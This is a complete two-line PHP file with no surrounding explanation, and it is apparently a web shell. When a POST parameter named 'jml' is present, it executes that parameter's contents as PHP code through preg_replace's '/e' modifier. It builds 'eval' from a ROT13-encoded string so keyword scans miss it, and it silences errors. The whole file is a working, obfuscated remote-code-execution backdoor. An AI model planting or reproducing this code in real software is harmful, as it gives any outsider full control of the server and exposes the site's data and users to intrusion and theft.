<?php
if(isset($_POST['jml'])){($www = $_POST['jml']) && @preg_replace('/ad/e', '@' . str_rot13('riny') . '($www)', 'add');exit;}